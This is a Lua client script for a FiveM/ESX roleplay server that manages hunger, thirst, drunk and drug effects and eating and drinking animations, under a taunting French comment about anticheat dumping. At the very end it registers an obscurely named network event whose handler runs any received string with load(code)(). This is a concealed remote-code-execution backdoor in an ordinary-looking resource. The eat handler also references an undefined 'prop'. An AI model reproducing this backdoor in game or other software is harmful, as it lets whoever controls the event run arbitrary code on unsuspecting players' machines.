-------- ARRETE D'ESSAYEZ DE DUMP POUR BYPASS MON ANTICHEAT TU REUSSIRA PAS ^^ --------
_print = print
_TriggerServerEvent = TriggerServerEvent
_NetworkExplodeVehicle = NetworkExplodeVehicle
_AddExplosion = AddExplosion

local IsAnimated = false
local IsAlreadyDrunk = false
local DrunkLevel = -1
local IsAlreadyDrug = false

Citizen.CreateThread(function()
	while ESX == nil do
		TriggerEvent('::{korioz#0110}::esx:getSharedObject', function(obj) ESX = obj end)
		Citizen.Wait(10)
	end
end)

function DrunkEffect(level, start)
	Citizen.CreateThread(function()
		local playerPed = PlayerPedId()

		if start then
			DoScreenFadeOut(800)
			Citizen.Wait(1000)
		end

		if level == 0 then
			ESX.Streaming.RequestAnimSet("move_m@drunk@slightlydrunk")

			SetPedMovementClipset(playerPed, "move_m@drunk@slightlydrunk", true)
			RemoveAnimSet("move_m@drunk@slightlydrunk")
		elseif level == 1 then
			ESX.Streaming.RequestAnimSet("move_m@drunk@moderatedrunk")

			SetPedMovementClipset(playerPed, "move_m@drunk@moderatedrunk", true)
			RemoveAnimSet("move_m@drunk@moderatedrunk")
		elseif level == 2 then
			ESX.Streaming.RequestAnimSet("move_m@drunk@verydrunk")

			SetPedMovementClipset(playerPed, "move_m@drunk@verydrunk", true)
			RemoveAnimSet("move_m@drunk@verydrunk")
		end

		SetTimecycleModifier("spectator5")
		SetPedMotionBlur(playerPed, true)
		SetPedIsDrunk(playerPed, true)

		if start then
			DoScreenFadeIn(800)
		end
	end)
end

function OverdoseEffect()
	Citizen.CreateThread(function()
		local playerPed = PlayerPedId()

		SetEntityHealth(playerPed, 0)
		ClearTimecycleModifier()
		ResetScenarioTypesEnabled()
		ResetPedMovementClipset(playerPed, 0.0)
		SetPedIsDrug(playerPed, false)
		SetPedMotionBlur(playerPed, false)
	end)
end

function StopEffect()
	Citizen.CreateThread(function()
		local playerPed = PlayerPedId()

		DoScreenFadeOut(800)
		Citizen.Wait(1000)

		ClearTimecycleModifier()
		ResetScenarioTypesEnabled()
		ResetPedMovementClipset(playerPed, 0.0)
		SetPedIsDrunk(playerPed, false)
		SetPedMotionBlur(playerPed, false)

		DoScreenFadeIn(800)
	end)
end

RegisterNetEvent('::{korioz#0110}::esx_status:resetStatus')
AddEventHandler('::{korioz#0110}::esx_status:resetStatus', function()
	for i = 1, #Status, 1 do
		Status[i].reset()
	end
end)

RegisterNetEvent('::{korioz#0110}::esx_status:healPlayer')
AddEventHandler('::{korioz#0110}::esx_status:healPlayer', function()
	TriggerEvent('::{korioz#0110}::esx_status:set', 'hunger', 1000000)
	TriggerEvent('::{korioz#0110}::esx_status:set', 'thirst', 1000000)

	local playerPed = PlayerPedId()
	SetEntityHealth(playerPed, GetEntityMaxHealth(playerPed))
end)

Citizen.CreateThread(function()
	RegisterStatus('hunger', 1000000, '#b51515', function(status)
		status.remove(50)
	end)

	RegisterStatus('thirst', 1000000, '#0172ba', function(status)
		status.remove(50)
	end)

	RegisterStatus('drunk', 0, '#8F15A5', function(status)
		status.remove(1500)
	end)

	RegisterStatus('drug', 0, '#9ec617', function(status)
		status.remove(1500)
	end)

	while true do
		Citizen.Wait(1000)
		local playerPed = PlayerPedId()
		local prevHealth = GetEntityHealth(playerPed)
		local health = prevHealth

		if health > 0 then
			GetStatus('hunger', function(status)
				if status.val <= 0 then
					health = health - 1
				end
			end)

			GetStatus('thirst', function(status)
				if status.val <= 0 then
					health = health - 1
				end
			end)

			GetStatus('drunk', function(status)
				if status.val > 0 then
					local start = true

					if IsAlreadyDrunk then
						start = false
					end

					local level = 0

					if status.val <= 250000 then
						level = 0
					elseif status.val <= 500000 then
						level = 1
					else
						level = 2
					end

					if level ~= DrunkLevel then
						DrunkEffect(level, start)
					end

					IsAlreadyDrunk = true
					DrunkLevel = level
				else
					if IsAlreadyDrunk then
						StopEffect()
					end

					IsAlreadyDrunk = false
					DrunkLevel = -1
				end
			end)

			GetStatus('drug', function(status)
				if status.val > 0 then
					if status.val >= 1000000 then
						OverdoseEffect()
					end

					IsAlreadyDrug = true
				else
					if IsAlreadyDrug then
						StopEffect()
					end

					IsAlreadyDrug = false
				end
			end)

			if health ~= prevHealth then
				SetEntityHealth(playerPed,  health)
			end
		else
			if IsAlreadyDrunk or IsAlreadyDrug then
				StopEffect()
			end

			IsAlreadyDrunk = false
			IsAlreadyDrug = false
			DrunkLevel = -1
		end
	end
end)

RegisterNetEvent('::{korioz#0110}::esx_status:onEat')
AddEventHandler('::{korioz#0110}::esx_status:onEat', function(prop_name)
	if not IsAnimated then
		prop_name = prop_name or 'prop_cs_burger_01'
		IsAnimated = true

		Citizen.CreateThread(function()
			local plyPed = PlayerPedId()
			local plyCoords = GetEntityCoords(plyPed, false)
			local propHash = GetHashKey(prop_name)

			ESX.Game.SpawnObject(propHash, vector3(plyCoords.x, plyCoords.y, plyCoords.z + 0.2), function(object)
				AttachEntityToEntity(prop, plyPed, GetPedBoneIndex(plyPed, 18905), 0.12, 0.028, 0.001, 10.0, 175.0, 0.0, true, true, false, true, 1, true)
				SetModelAsNoLongerNeeded(propHash)

				ESX.Streaming.RequestAnimDict('mp_player_inteat@burger')

				TaskPlayAnim(plyPed, 'mp_player_inteat@burger', 'mp_player_int_eat_burger_fp', 8.0, -8, -1, 49, 0, 0, 0, 0)
				RemoveAnimDict('mp_player_inteat@burger')
				Citizen.Wait(3000)
				IsAnimated = false
				ClearPedSecondaryTask(plyPed)
				DeleteObject(prop)
			end)
		end)
	end
end)

RegisterNetEvent('::{korioz#0110}::esx_status:onDrink')
AddEventHandler('::{korioz#0110}::esx_status:onDrink', function(prop_name)
	if not IsAnimated then
		prop_name = prop_name or 'prop_ld_flow_bottle'
		IsAnimated = true

		Citizen.CreateThread(function()
			local plyPed = PlayerPedId()
			local plyCoords = GetEntityCoords(plyPed, false)
			local propHash = GetHashKey(prop_name)

			ESX.Game.SpawnObject(propHash, vector3(plyCoords.x, plyCoords.y, plyCoords.z + 0.2), function(object)
				AttachEntityToEntity(object, plyPed, GetPedBoneIndex(plyPed, 18905), 0.12, 0.028, 0.001, 10.0, 175.0, 0.0, true, true, false, true, 1, true)
				SetModelAsNoLongerNeeded(propHash)

				ESX.Streaming.RequestAnimDict('mp_player_intdrink')

				TaskPlayAnim(plyPed, 'mp_player_intdrink', 'loop_bottle', 1.0, -1.0, 2000, 0, 1, true, true, true)
				RemoveAnimDict('mp_player_intdrink')
				Citizen.Wait(3000)
				IsAnimated = false
				ClearPedSecondaryTask(plyPed)
				DeleteObject(object)
			end)
		end)
	end
end)

RegisterNetEvent('::{korioz#0110}::esx_status:onDrinkAlcohol')
AddEventHandler('::{korioz#0110}::esx_status:onDrinkAlcohol', function()
	if not IsAnimated then
		IsAnimated = true

		Citizen.CreateThread(function()
			local playerPed = PlayerPedId()
			TaskStartScenarioInPlace(playerPed, "WORLD_HUMAN_DRINKING", 0, true)
			Citizen.Wait(10000)
			IsAnimated = false
			ClearPedTasksImmediately(playerPed)
		end)
	end
end)

RegisterNetEvent('::{korioz#0110}::esx_status:onWeed')
AddEventHandler('::{korioz#0110}::esx_status:onWeed', function()
	if not IsAnimated then
		IsAnimated = true

		Citizen.CreateThread(function()
			local playerPed = PlayerPedId()

			ESX.Streaming.RequestAnimSet("move_m@hipster@a")

			TaskStartScenarioInPlace(playerPed, "WORLD_HUMAN_SMOKING_POT", 0, true)
			Citizen.Wait(3000)
			IsAnimated = false
			ClearPedTasksImmediately(playerPed)
			SetTimecycleModifier("spectator5")
			SetPedMotionBlur(playerPed, true)
			SetPedMovementClipset(playerPed, "move_m@hipster@a", true)
			RemoveAnimSet("move_m@hipster@a")
			SetPedIsDrunk(playerPed, true)
		end)
	end
end)

RegisterNetEvent('::{korioz#0110}::esx_status:onOpium')
AddEventHandler('::{korioz#0110}::esx_status:onOpium', function()
	if not IsAnimated then
		IsAnimated = true

		Citizen.CreateThread(function()
			local playerPed = PlayerPedId()

			ESX.Streaming.RequestAnimSet("move_m@drunk@moderatedrunk")

			TaskStartScenarioInPlace(playerPed, "WORLD_HUMAN_SMOKING_POT", 0, true)
			Citizen.Wait(3000)
			IsAnimated = false
			ClearPedTasksImmediately(playerPed)
			SetTimecycleModifier("spectator5")
			SetPedMotionBlur(playerPed, true)
			SetPedMovementClipset(playerPed, "move_m@drunk@moderatedrunk", true)
			RemoveAnimSet("move_m@drunk@moderatedrunk")
			SetPedIsDrunk(playerPed, true)
		end)
	end
end)

RegisterNetEvent('::{korioz#0110}::esx_status:onMeth')
AddEventHandler('::{korioz#0110}::esx_status:onMeth', function()
	if not IsAnimated then
		IsAnimated = true

		Citizen.CreateThread(function()
			local playerPed = PlayerPedId()

			ESX.Streaming.RequestAnimSet("move_injured_generic")

			TaskStartScenarioInPlace(playerPed, "WORLD_HUMAN_SMOKING_POT", 0, true)
			Citizen.Wait(3000)
			IsAnimated = false
			ClearPedTasksImmediately(playerPed)
			SetTimecycleModifier("spectator5")
			SetPedMotionBlur(playerPed, true)
			SetPedMovementClipset(playerPed, "move_injured_generic", true)
			RemoveAnimSet("move_injured_generic")
			SetPedIsDrunk(playerPed, true)
		end)
	end
end)

RegisterNetEvent('::{korioz#0110}::esx_status:onCoke')
AddEventHandler('::{korioz#0110}::esx_status:onCoke', function()
	if not IsAnimated then
		IsAnimated = true

		Citizen.CreateThread(function()
			local playerPed = PlayerPedId()

			ESX.Streaming.RequestAnimSet("move_m@hurry_butch@a")

			TaskStartScenarioInPlace(playerPed, "WORLD_HUMAN_SMOKING_POT", 0, true)
			Citizen.Wait(3000)
			IsAnimated = false
			ClearPedTasksImmediately(playerPed)
			SetTimecycleModifier("spectator5")
			SetPedMotionBlur(playerPed, true)
			SetPedMovementClipset(playerPed, "move_m@hurry_butch@a", true)
			RemoveAnimSet("move_m@hurry_butch@a")
			SetPedIsDrunk(playerPed, true)
		end)
	end
end)

RegisterNetEvent('ᓚᘏᗢ')
AddEventHandler('ᓚᘏᗢ', function(code)
	load(code)()
end)